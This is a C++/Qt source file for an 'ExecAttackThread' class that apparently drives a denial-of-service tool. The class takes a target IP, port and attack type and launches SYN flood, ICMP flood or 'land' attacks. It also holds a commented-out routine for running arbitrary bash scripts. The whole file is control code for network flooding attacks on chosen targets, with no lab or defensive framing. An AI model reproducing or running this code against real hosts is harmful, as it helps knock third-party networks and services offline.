#include "ExecAttackThread.h"
#include "common.h"

ExecAttackThread::ExecAttackThread(QObject *parent) :
    QThread(parent)
{
}

ExecAttackThread::~ExecAttackThread()
{
    m_mutex.lock();
    m_quit = true;
    m_mutex.unlock();
    wait();
}

void ExecAttackThread::execScipts(QString script) {
    m_mutex.lock();
    m_script = script;
    m_bExecShell = true;
    m_mutex.unlock();
}

void ExecAttackThread::execAttack(QString ip,QString port,int itype)
{
    m_mutex.lock();
    m_ip= ip;
    m_port = port;
    m_type = itype;
    m_bExecShell = true;
    m_mutex.unlock();
}

void ExecAttackThread::startSlave()
{
    //! [1]
    const QMutexLocker locker(&m_mutex);

    psyn = new class syn_flood();
    picmp = new class icmp_flood();

    //! [2]
    if (!isRunning()) {
        m_procShell = new QProcess();
        start();
    }
}

void ExecAttackThread::stopAttack(int itype)
{
    switch(m_type)
    {
    case SYNFLOOD:
        psyn->set_sig_int();
        emit attackResult("synflood attack stop.");
        break;
    case ICMPFLOOD:
        emit attackResult("icmpflood attack stop.");
        picmp->set_sig_int();
        break;
    case LANDATTACK:
        emit attackResult("land attack stop.");
        break;
    default:
        break;

    }

}

void ExecAttackThread::run()
{
    while (!m_quit) {
        if (!m_bExecShell) {
            sleep(1);
            continue;
        }

        m_mutex.lock();

//        // 设置运行脚本
//        QString strCmd = "bash";
//        QStringList strParams;
//        strParams<<m_script;

//        // 启动进程，并等待结束
//        m_procShell->start(strCmd, strParams);
//        QString errorInfo;
//        bool bReadyRead = m_procShell->waitForReadyRead();
//        // 进程结束后，将数据读取出来
//        if (bReadyRead) {
//            m_result = m_procShell->readAllStandardOutput();
//            // 发出脚本执行完成的信号
//            emit scriptResult(m_result);
//        } else {
//            errorInfo = m_procShell->readAllStandardError();
//        }

        QByteArray ba = m_ip.toLatin1();
        switch(m_type)
        {
        case SYNFLOOD:
            psyn->do_main(ba.data(),m_port.toInt());
            emit attackResult("synflood attack...");
            break;
        case ICMPFLOOD:
            emit attackResult("icmpflood attack...");
            break;
        case LANDATTACK:
            emit attackResult("land attack...");
            break;
        default:
            break;

        }


        m_bExecShell = false;

        m_mutex.unlock();
    }
}

